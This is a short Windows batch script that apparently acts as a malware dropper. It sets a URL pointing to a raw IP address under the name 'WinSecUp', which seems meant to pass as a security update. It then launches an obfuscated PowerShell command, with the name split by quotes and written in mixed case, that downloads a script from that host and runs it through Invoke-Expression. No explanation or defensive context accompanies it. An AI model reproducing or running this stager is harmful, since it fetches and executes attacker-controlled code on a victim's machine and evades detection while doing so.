@ECHO OFF
setlocal
set URL=http://11.12.111.23:8000/WinSecUp
po""weR""sHelL -nO""p -c "& { $URL = '%URL%'; iEx(New-Object Net.WEbclIent).DoWnLOadstRinG($URL)}"
